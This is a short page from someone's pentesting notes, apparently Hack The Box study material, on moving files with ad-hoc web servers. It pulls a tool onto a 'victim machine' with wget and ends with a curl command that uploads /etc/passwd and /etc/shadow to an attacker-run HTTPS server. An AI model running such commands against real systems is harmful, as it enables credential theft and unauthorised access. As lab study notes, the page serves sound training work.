---
description: >-
  File transfer via web server.
title: Local Web Server                 # Add title here
date: 2022-09-05 08:00:00 -0600                           # Change the date to match completion date
categories: [03 File Transfer, Linux - Local Web Server]                     # Change Templates to Writeup
tags: [file transfer, linux web server]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Python3
Via web:

```bash
# On our machine:
python3 -m http.server 8888

# On victim machine:

wget http://10.10.16.5:8888/pspy64
chmod +x pspy64
```

### Python2
```bash 
python -m SimpleHTTPServer 7331
```

### PHP
```bash
php -S 0.0.0.0:8080
```

### Ruby
```bash
ruby -run -e httpd . -p 9000
```

### Busybox
```bash
busybox httpd -f -p 10000
```

### Surge.sh
This is an excellent option to host an Internet exposed web server.
First we need to install surge with npm:
```bash
npm install --global surge
```
Then we need to execute the surge command and provide all the details needed to host our web server.
- File's path, all the files within will be hosted.
- Name of your web server, this will be the subdomain you choose and it must have the surge.sh as domain, if it's already taken it won't work.
```bash
surge             

   Running as shuciran@gmail.com (Student)

        project: /opt/test/
         domain: blue-eyed-harmony.surge.sh
         upload: [====================] 100% eta: 0.0s (1 files, 15 bytes)
            CDN: [====================] 100%
     encryption: *.surge.sh, surge.sh (48 days)
             IP: 138.197.235.123

   Success! - Published to blue-eyed-harmony.surge.sh
```

> If this is the first time, you'll need to provide an e-mail and a password.
{: .prompt-info }

> If you want to exploit XSS, SSRF or any vulnerability from another server you'll need to host a CORS file with content "*" this way you'll allow consumption of resources from external entities.
{: .prompt-tip }

### Web Server Upload

Let's see how we can configure the uploadserver module to use HTTPS for secure communication.

1) Install the uploadserver module.
```bash
Shuciran@htb[/htb]$ sudo python3 -m pip install --user uploadserver
```

2) Create a self-signed certificate.
```bash
Shuciran@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

> The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
{: .prompt-warning }

3) Start Web Server
```bash
Shuciran@htb[/htb]$ mkdir https && cd https
Shuciran@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```
4) Transfer the file via CURL
```bash
Shuciran@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
> We used the option --insecure because we used a self-signed certificate that we trust.
{: .prompt-warning }